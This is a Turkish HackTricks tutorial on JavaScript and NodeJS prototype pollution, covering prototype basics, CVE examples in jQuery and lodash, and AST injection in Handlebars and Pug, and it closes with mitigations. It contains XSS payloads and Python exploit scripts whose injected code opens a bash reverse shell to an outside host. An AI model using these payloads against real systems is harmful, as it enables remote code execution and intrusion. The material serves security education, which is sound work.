# NodeJS - \_\_proto\_\_ & prototype Kirliliği

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi **HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** isterseniz, [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

## JavaScript'te Nesneler <a href="#053a" id="053a"></a>

JavaScript'te nesneler, temelde özellikler olarak bilinen anahtar-değer çiftlerinin koleksiyonudur. Bir nesne, `null` argümanıyla `Object.create` kullanılarak boş bir nesne oluşturulabilir. Bu yöntem, herhangi bir miras alınmış özelliği olmayan bir nesnenin oluşturulmasına olanak tanır.
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
Boş bir nesne, `{}` olarak temsil edilen boş bir sözlüğe benzer.

### JavaScript'te Fonksiyonlar ve Sınıflar

JavaScript'te, fonksiyonlar ve sınıflar yakından ilişkilidir ve fonksiyonlar genellikle sınıfların yapıcıları olarak hizmet eder. JavaScript'in yerel sınıf desteği eksikliğine rağmen, yapıcılar sınıf davranışını taklit edebilir.
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### JavaScript'te Prototipler

JavaScript, çalışma zamanında prototip özelliklerinin değiştirilmesine, eklenmesine veya silinmesine izin verir. Bu esneklik, sınıf işlevselliğinin dinamik olarak genişletilmesini sağlar.

`toString` ve `valueOf` gibi işlevlerin davranışını değiştirmek için değiştirilebilir, bu da JavaScript'in prototip sisteminin uyarlanabilir doğasını gösterir.

## Kalıtım

Prototip tabanlı programlamada, özellikler/metodlar sınıflardan nesnelere miras alınır. Bu sınıflar, özellikler/metodlar ya başka bir sınıfın bir örneğine ya da boş bir nesneye eklenerek oluşturulur.

Dikkat edilmesi gereken bir nokta, başka nesnelerin prototipi olarak hizmet eden bir nesneye (örneğin `myPersonObj`) bir özellik eklenirse, miras alan nesneler bu yeni özelliğe erişim kazanır. Ancak, bu özellik otomatik olarak görüntülenmez, açıkça çağrılmadıkça.

## \_\_proto\_\_ kirliliği <a href="#0d0a" id="0d0a"></a>

## JavaScript'te Prototip Kirliliğini Keşfetmek

JavaScript nesneleri, anahtar-değer çiftleriyle tanımlanır ve JavaScript Object prototipinden miras alır. Bu, Object prototipinin değiştirilmesinin ortamdaki tüm nesneleri etkileyebileceği anlamına gelir.

Bunu anlatmak için farklı bir örnek kullanalım:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
Object prototipine erişim, aşağıdaki yollarla mümkündür:
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
Object prototipine özellikler ekleyerek, her JavaScript nesnesi bu yeni özellikleri miras alacaktır:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## prototip kirliliği

`__proto__` kullanımının kısıtlandığı bir senaryoda, bir fonksiyonun prototipini değiştirmek bir alternatiftir:
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
Bu, yalnızca `Vehicle` yapıcısından oluşturulan nesneleri etkiler ve onlara `beep`, `hasWheels`, `honk` ve `isElectric` özelliklerini verir.

Prototip kirliliği yoluyla JavaScript nesnelerini genel olarak etkilemek için iki yöntem bulunur:

1. `Object.prototype`'yi doğrudan kirletmek:
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. Yaygın olarak kullanılan bir yapının yapıcı prototipini kirletmek:
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
Bu işlemlerden sonra, her JavaScript nesnesi `goodbye` ve `greet` metodlarını çalıştırabilir.

## Diğer nesneleri kirletme

### Bir sınıftan Object.prototype'a

Belirli bir nesneyi kirletebildiğiniz ve `Object.prototype`'ye ulaşmanız gereken bir senaryoda, aşağıdaki gibi bir kodla onu arayabilirsiniz:
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Dizi elemanlarının kirlenmesi

JS'de nesnelerin özelliklerini kirletebileceğiniz gibi, bir diziyi kirletebilirseniz, dizinin **indekslerle erişilebilen değerlerini de kirletebilirsiniz** (değerleri üzerine yazamazsınız, bu yüzden yazılmayan ancak bir şekilde kullanılan indeksleri kirletmeniz gerekmektedir).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Html öğelerinin kirlenmesi

JS aracılığıyla bir HTML öğesi oluşturulurken, **`innerHTML`** özelliğini **üzerine yazarak** **keyfi HTML kodu yazmak mümkündür.** [Bu yazıdan fikir ve örnek](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Örnekler

### Temel Örnek

Prototip kirliliği, uygulamadaki bir hatadan kaynaklanan ve `Object.prototype` üzerindeki özelliklerin üzerine yazılmasına izin veren bir zayıflık nedeniyle meydana gelir. Bu, çoğu nesnenin özelliklerini `Object.prototype`'den türettiği anlamına gelir.

En basit örnek, kontrol edilecek bir nesnenin **tanımsız bir özelliğine bir değer eklemektir**. Örneğin:
```javascript
if (user.admin) {
```
Eğer **`admin` özelliği tanımlanmamışsa**, bir PP'yi kötüye kullanarak onu True olarak ayarlamak mümkündür. Bunun gibi bir şeyle:
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
Bu mekanizmanın arkasındaki mantık, saldırganın belirli girişlere sahip olması durumunda uygulamadaki tüm nesnelerin prototipini değiştirebilmesini sağlayacak şekilde özellikleri manipüle etmektir. Bu manipülasyon genellikle `__proto__` özelliğinin ayarlanmasıyla gerçekleştirilir, çünkü JavaScript'te bu, bir nesnenin prototipini doğrudan değiştirmekle eşanlamlıdır.

Bu saldırının başarıyla gerçekleştirilebileceği koşullar, belirli bir [çalışmada](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf) belirtilmiştir:

- Yinelemeli bir birleştirme gerçekleştirme.
- Bir yol temelinde özelliklerin tanımlanması.
- Nesnelerin klonlanması.


### Fonksiyonu geçersiz kılma
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Proto Kirliliği ile Uzaktan Kod Çalıştırma (RCE)

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

## İstemci tarafı proto kirliliği ile XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019–11358: jQuery $ .extend ile Proto Kirliliği Saldırısı

[Daha fazla ayrıntı için bu makaleye bakın](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
jQuery'de, `$ .extend` fonksiyonu derin kopyalama özelliği yanlış kullanıldığında proto kirliliğine neden olabilir. Bu fonksiyon genellikle nesneleri klonlamak veya varsayılan bir nesneden özellikleri birleştirmek için kullanılır. Ancak yanlış yapılandırıldığında, yeni bir nesne için tasarlanan özellikler prototipe atanabilir. Örneğin:
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
Bu zafiyet, CVE-2019-11358 olarak tanımlanmış olup, derin bir kopyalama işlemi yanlışlıkla prototipi değiştirebilir ve `isAdmin` gibi özelliklerin uygun varlık doğrulaması olmadan kontrol edilmesi durumunda yetkisiz yönetici erişimi gibi potansiyel güvenlik risklerine yol açabilir.


### CVE-2018-3721, CVE-2019-10744: lodash üzerinden prototip kirliliği saldırısı

[Daha fazla ayrıntı için bu makaleye bakın](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash), benzer prototip kirliliği zafiyetlerine (CVE-2018-3721, CVE-2019-10744) rastlamıştır. Bu sorunlar 4.17.11 sürümünde çözülmüştür.

### CVE'lerle başka bir öğretici

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### NodeJS'de AST Prototip Kirliliği

NodeJS, şablon motorları ve TypeScript gibi işlevler için JavaScript'te Soyut Sözdizimi Ağaçları (AST) yoğun bir şekilde kullanır. Bu bölüm, şablon motorları olan Handlebars ve Pug ile ilişkili prototip kirliliği zafiyetlerini araştırır.

#### Handlebars Zafiyet Analizi

Handlebars şablon motoru, prototip kirliliği saldırısına karşı savunmasızdır. Bu zafiyet, `javascript-compiler.js` dosyasındaki belirli fonksiyonlardan kaynaklanır. Örneğin, `appendContent` fonksiyonu, `pendingContent` varsa birleştirirken, `pushSource` fonksiyonu kaynağı ekledikten sonra `pendingContent`'i `undefined` olarak sıfırlar.

##### Saldırı Süreci

Saldırı, Handlebars tarafından üretilen Soyut Sözdizimi Ağacı (AST) kullanılarak gerçekleştirilir ve aşağıdaki adımları izler:

1. **Ayrıştırıcının Manipülasyonu**: İlk olarak, ayrıştırıcı, `NumberLiteral` düğümü aracılığıyla değerlerin sayısal olmasını zorlar. Prototip kirliliği, sayısal olmayan dizelerin eklenmesine izin vererek bunu atlayabilir.
2. **Derleyici Tarafından İşlenme**: Derleyici, bir AST Nesnesi veya bir dize şablonu işleyebilir. Eğer `input.type` `Program`'a eşitse, giriş önceden ayrıştırılmış olarak işlenir ve bu istismar edilebilir.
3. **Kod Enjeksiyonu**: `Object.prototype`'nin manipülasyonuyla, şablon fonksiyonuna keyfi kod enjekte edilebilir ve bu da uzaktan kod yürütmeyle sonuçlanabilir.

Handlebars zafiyetinin istismarını gösteren bir örnek:
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
Bu kod, bir saldırganın Handlebars şablonuna keyfi kod enjekte edebileceğini göstermektedir.

**Harici Referans**: 'flat' kütüphanesindeki bir prototip kirliliği sorunu, burada detaylı olarak açıklanmıştır: [GitHub'da Sorun](https://github.com/hughsk/flat/issues/105).

**Harici Referans**: 'flat' kütüphanesindeki prototip kirliliği sorunuyla ilgili bir sorun: [GitHub'da Sorun](https://github.com/hughsk/flat/issues/105)

Python'da prototip kirliliği saldırısı örneği:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Pug Zafiyeti

Pug, başka bir şablon motoru, prototip kirliliği riskiyle karşı karşıyadır. Ayrıntılı bilgi, [Pug'da AST Enjeksiyonu](https://blog.p6.is/AST-Injection/#Pug) başlıklı tartışmada bulunabilir.

Pug'da prototip kirliliği örneği:
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### Önleyici Önlemler

Prototip kirliliği riskini azaltmak için aşağıdaki stratejiler kullanılabilir:

1. **Nesne Değişmezliği**: `Object.prototype` `Object.freeze` uygulanarak değişmez hale getirilebilir.
2. **Giriş Doğrulama**: JSON girişleri, uygulamanın şemasına sıkı bir şekilde doğrulanmalıdır.
3. **Güvenli Birleştirme Fonksiyonları**: Güvensiz şekilde kullanılan özyinelemeli birleştirme fonksiyonlarından kaçınılmalıdır.
4. **Prototipsiz Nesneler**: Prototip özellikleri olmayan nesneler, `Object.create(null)` kullanılarak oluşturulabilir.
5. **Map Kullanımı**: `Object` yerine, anahtar-değer çiftlerini depolamak için `Map` kullanılmalıdır.
6. **Kütüphane Güncellemeleri**: Kütüphaneleri düzenli olarak güncelleyerek güvenlik yamaları uygulanabilir.
7. **Linter ve Statik Analiz Araçları**: Prototype kirliliği açıklarını tespit etmek ve önlemek için ESLint gibi uygun eklentilere sahip araçlar kullanın.
8. **Kod İncelemeleri**: Prototype kirliliği ile ilgili potansiyel riskleri belirlemek ve gidermek için kapsamlı kod incelemeleri yapın.
9. **Güvenlik Eğitimi**: Geliştiricileri prototype kirliliği riskleri ve güvenli kod yazma en iyi uygulamaları konusunda eğitin.
10. **Dikkatli Kütüphane Kullanımı**: Üçüncü taraf kütüphaneleri kullanırken dikkatli olun. Güvenlik durumlarını değerlendirin ve özellikle nesneleri manipüle eden kütüphanelerin kodunu gözden geçirin.
11. **Çalışma Zamanı Koruması**: Prototype kirliliği saldırılarını tespit edebilen ve önleyebilen güvenlik odaklı npm paketleri gibi çalışma zamanı koruma mekanizmaları kullanın.

## Referanslar

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklam vermek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına PR göndererek paylaşın.

</details>
